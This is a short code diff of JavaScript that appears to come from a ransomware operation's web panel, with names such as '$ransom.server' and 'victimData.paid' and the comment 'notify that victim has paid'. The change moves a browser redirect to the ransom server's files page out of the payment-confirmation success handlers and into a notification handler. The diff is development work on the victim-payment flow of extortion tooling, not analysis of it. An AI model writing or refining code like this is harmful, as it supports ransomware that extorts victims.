@@ -53,6 +53,8 @@ var main = function () {
                         data: userData,
                         success: function () {
                             console.log(userName, "(" + userId + ")", "has", notify, "notifications");
+                            // redirect
+                            window.location.href = $ransom.server.files;
                         },
                         error: function (error) {
                             console.log("result " + result.length +  " : ajax error " + error.status);
@@ -111,8 +113,6 @@ var main = function () {
                             success: function () {
                                 // notify that victim has paid
                                 sendNotification(victimData.paid);
-                                // redirect
-                                window.location.href = $ransom.server.files;
                             },
                             error: function (error) {
                                 console.log("result " + result.length +  " : ajax error " + error.status);
@@ -134,8 +134,6 @@ var main = function () {
                             success: function () {
                                 // notify that victim has paid
                                 sendNotification(victimData.paid);
-                                // redirect
-                                window.location.href = $ransom.server.files;
                             },
                             error: function (error) {
                                 console.log("result " + result.length +  " : ajax error " + error.status);
